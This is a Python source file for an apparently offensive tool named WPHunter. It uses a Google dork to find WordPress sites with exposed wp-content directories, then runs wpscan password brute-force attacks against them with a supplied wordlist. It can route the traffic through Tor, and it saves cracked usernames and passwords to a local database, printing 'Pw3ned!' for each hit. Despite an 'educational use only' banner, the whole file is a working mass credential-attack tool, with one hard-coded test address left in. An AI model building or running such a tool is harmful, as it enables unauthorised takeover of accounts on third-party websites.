# -*- coding: utf-8 -*-
# Author: calfcrusher@inventati.org

import os
import signal
import time
import subprocess
import json
import sqlite3

from googlesearch import search
from urllib.parse import urlparse
from pathlib import Path
from termcolor import colored
from subprocess import check_output
from prettytable import from_db_cursor


def showcreds():
    """Load and show credentials from db"""

    conn = sqlite3.connect(dbfile)
    with conn:
        cur = conn.cursor()
        cur.execute('SELECT * FROM Credentials ORDER BY url')
        data = from_db_cursor(cur)

    print('\n'.strip('\n'))
    print(data)
    print('\n'.strip('\n'))

    cur.close()

    while True:
        response = input(colored(" * Back to menu or exit [menu/exit] ", 'yellow'))
        if not response.isalpha():
            continue
        if response == 'menu' or response == 'exit':
            break

    if response == 'menu':
        # Back to menu
        os.system("clear")
        main()
    else:
        # Exit
        os.system("clear")
        exit(0)

def savecreds(pathfile, url):
    """Save possible credentials to db"""

    try:
        connection = sqlite3.connect(dbfile)
        cursor = connection.cursor()
        # Reading JSON from file - a nested dict -
        with open(pathfile) as json_file:
            obj_data = json.load(json_file)
            # Write credentials to database
            for username in obj_data['password_attack']:
                if username:
                    print(colored(" * Pw3ned! " + url, 'magenta'))
                    cursor.execute("Insert into Credentials values (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
                    connection.commit()
        cursor.close()
    except sqlite3.Error as error:
        print(colored(" * Error while connecting to database!", 'red'))


def wpscan(wpurl, wordlists, pathfile, usetor):
    """Run wpscan """

    if usetor:
        # Run wpscan with tor
        os.system("wpscan -t 4 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
        savecreds(pathfile, wpurl)
    else:
        # Run wpscan without tor
        os.system("wpscan --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
        savecreds(pathfile, wpurl)


def googledork(dork, amount, wordlist, usetor):
    """Wordpress google dork"""

    print('\n'.strip('\n'))
    print(colored(" * Retrieving dork results..", 'red'))

    requ = 0

    for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=8):
        parsed_uri = urlparse(result)
        wordpress = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
        wordpress = "http://192.168.1.29/wordpress/"
        # Check if we already have this domain in loot folder
        filename = parsed_uri.netloc + ".json".strip('\n')
        pathfile = os.getcwd() + "/loot/" + filename
        if Path(pathfile).is_file():
            # File exist already so skip this host
            print(colored(" - Skipping " + wordpress + " (already scanned)", 'red'))
            time.sleep(0.1)
            requ += 1
            if requ >= int(amount):
                break
            time.sleep(0.1)
            continue

        print(colored(" + Scanning " + wordpress, 'red'))
        wpscan(wordpress, wordlist, pathfile, usetor)
        time.sleep(0.1)
        requ += 1
        if requ >= int(amount):
            break
        time.sleep(0.1)


def main():
    """Main function of tool"""

    print("""\033[91m 
  ░██╗░░░░░░░██╗██████╗░██╗░░██╗██╗░░░██╗███╗░░██╗████████╗███████╗██████╗░
  ░██║░░██╗░░██║██╔══██╗██║░░██║██║░░░██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗
  ░╚██╗████╗██╔╝██████╔╝███████║██║░░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝
  ░░████╔═████║░██╔═══╝░██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗
  ░░╚██╔╝░╚██╔╝░██║░░░░░██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║
  ░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
        
 Author: calfcrusher | https://github.com/CalfCrusher | For educational use only!
    \x1b[0m""")

    global dbfile
    dbfile = "creds.db"

    print(colored(" -------------------", 'green'))
    print(colored(" 1. Search & Brute", 'green'))
    print(colored(" 2. Show Credentials", 'green'))
    print(colored(" 3. Exit", 'green'))
    print(colored(" -------------------", 'green'))
    print('\n'.strip('\n'))

    while True:
        response = input(colored(" * Enter your choice [1-3] ", 'yellow'))
        if not response.isnumeric():
            main()
            continue
        else:
            break

    if int(response) == 2:
        showcreds()

    elif int(response) == 3:
        os.system("clear")
        exit(0)
    elif int(response) != 1:
        main()

    # Wordpress google dork
    dork = "\"index of\" inurl:wp-content/\""

    while True:
        response = input(colored(" * Enter number of results to retrieve: ", 'yellow'))
        if not response.isnumeric():
            print(colored(" ! Please insert a number", 'red'))
            continue
        else:
            amount = response
            break
    while True:
        response = input(colored(" * Type full path to password wordlist: ", 'yellow'))
        if not os.path.isfile(response):
            print(colored(" * Unable to access file !", 'red'))
            continue
        else:
            wordlist = response
            break

    usetor = False

    while True:
        response = input(colored(" * Do you want use TOR? [yes/no] ", 'yellow'))
        if not response.isalpha():
            continue
        if response == 'yes' or response == 'no':
            break
    if response == 'yes':
        # Check if tor is installed
        rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
        if rc:
            # Asking for valid response
            while True:
                response = input(colored(" * Unable to find TOR! Run without it ? [yes/no]", 'yellow'))
                if not response.isalpha():
                    print(colored(" * Please type yes or no", 'red'))
                    continue
                if response == 'yes' or response == 'no':
                    break
            if response == 'yes':
                print(colored(" * running scan with TOR disabled..", 'red'))
                usetor = False
            else:
                print(colored(" * Exiting..", 'yellow'))
                exit(0)
        else:
            # Start TOR
            print(colored(" * Starting tor network..", 'yellow'))
            os.system("tor --quiet &")
            time.sleep(5)
            usetor = True

    googledork(dork, amount, wordlist, usetor)

    if usetor:
        # Kill TOR
        print(colored(" * Killing TOR pid..", 'yellow'))
        os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)

    print('\n'.strip('\n'))
    print(colored(" * Completed !", 'yellow'))
    exit(0)


if __name__ == '__main__':
    os.system("clear")
    main()
